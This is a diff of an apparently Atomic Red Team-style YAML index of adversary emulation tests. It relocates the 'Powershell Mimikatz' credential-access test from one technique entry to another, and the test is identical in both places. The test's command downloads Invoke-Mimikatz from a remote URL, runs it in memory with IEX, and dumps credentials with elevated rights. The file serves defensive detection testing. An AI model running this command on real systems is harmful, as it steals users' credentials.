@@ -20666,6 +20666,28 @@ credential-access:
 '
         name: command_prompt
         elevation_required: true
+    - name: Powershell Mimikatz
+      auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
+      description: "Dumps credentials from memory via Powershell by invoking a remote
+        mimikatz script.\nIf Mimikatz runs successfully you will see several usernames
+        and hashes output to the screen.\nCommon failures include seeing an \\\"access
+        denied\\\" error which results when Anti-Virus blocks execution. \nOr, if
+        you try to run the test without the required administrative privleges you
+        will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_script:
+          description: URL to a remote Mimikatz script that dumps credentials
+          type: Url
+          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+      executor:
+        command: 'IEX (New-Object Net.WebClient).DownloadString(''#{remote_script}'');
+          Invoke-Mimikatz -DumpCreds
+
+'
+        name: powershell
+        elevation_required: true
   T1557:
     technique:
       external_references:
@@ -21388,28 +21410,6 @@ credential-access:
       x_mitre_version: '2.0'
       identifier: T1003
     atomic_tests:
-    - name: Powershell Mimikatz
-      auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
-      description: "Dumps credentials from memory via Powershell by invoking a remote
-        mimikatz script.\nIf Mimikatz runs successfully you will see several usernames
-        and hashes output to the screen.\nCommon failures include seeing an \\\"access
-        denied\\\" error which results when Anti-Virus blocks execution. \nOr, if
-        you try to run the test without the required administrative privleges you
-        will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n"
-      supported_platforms:
-      - windows
-      input_arguments:
-        remote_script:
-          description: URL to a remote Mimikatz script that dumps credentials
-          type: Url
-          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
-      executor:
-        command: 'IEX (New-Object Net.WebClient).DownloadString(''#{remote_script}'');
-          Invoke-Mimikatz -DumpCreds
-
-'
-        name: powershell
-        elevation_required: true
     - name: Gsecdump
       auto_generated_guid: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
       description: "Dump credentials from memory using Gsecdump.\n\nUpon successful
